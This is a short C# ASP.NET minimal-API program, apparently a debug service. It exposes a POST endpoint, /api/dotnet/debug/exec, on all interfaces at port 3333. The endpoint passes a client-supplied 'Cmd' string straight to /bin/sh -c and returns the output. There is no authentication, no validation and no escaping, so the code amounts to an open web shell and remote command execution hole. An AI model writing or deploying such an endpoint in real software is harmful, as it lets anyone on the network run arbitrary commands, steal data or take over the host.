using System.Diagnostics;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapPost("/api/dotnet/debug/exec", async (CommandRequest req) =>
{
    if (string.IsNullOrWhiteSpace(req.Cmd)) return Results.BadRequest("no command");

    var psi = new ProcessStartInfo
    {
        FileName = "/bin/sh",
        Arguments = $"-c \"{req.Cmd}\"", 
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        UseShellExecute = false,
        CreateNoWindow = true
    };

    try
    {
        using var process = Process.Start(psi);
        if (process == null) return Results.StatusCode(500);
        
        var output = await process.StandardOutput.ReadToEndAsync();
        var error = await process.StandardError.ReadToEndAsync();
        await process.WaitForExitAsync();

        return Results.Text(output + error);
    }
    catch (Exception ex)
    {
        return Results.Problem(ex.Message);
    }
});

// 3333 포트로 실행
app.Run("http://0.0.0.0:3333");

record CommandRequest(string Cmd);